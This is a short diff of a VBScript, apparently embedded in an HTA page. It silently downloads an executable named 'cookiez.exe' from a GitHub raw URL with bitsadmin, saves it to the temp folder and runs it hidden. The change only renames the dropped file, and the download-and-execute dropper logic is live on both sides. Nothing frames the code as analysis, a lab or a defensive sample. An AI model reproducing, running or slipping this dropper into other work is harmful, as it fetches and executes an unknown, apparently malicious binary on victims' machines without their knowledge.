@@ -5,10 +5,10 @@ Dim shell: Set shell = CreateObject("WScript.Shell")
 Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
 Dim temp: temp = fso.GetSpecialFolder(2)
 
-shell.Run "bitsadmin /transfer d /download /priority high ""https://github.com/huh71943-s/dicecheck.app/raw/refs/heads/main/cookiez.exe"" """ & temp & "\wd.exe""", 0, True
+shell.Run "bitsadmin /transfer d /download /priority high ""https://github.com/huh71943-s/dicecheck.app/raw/refs/heads/main/cookiez.exe"" """ & temp & "\cookiez.exe""", 0, True
 
-If fso.FileExists(temp & "\wd.exe") Then
-    shell.Run """" & temp & "\wd.exe""", 0, False
+If fso.FileExists(temp & "\cookiez.exe") Then
+    shell.Run """" & temp & "\cookiez.exe""", 0, False
 End If
 
 window.close()
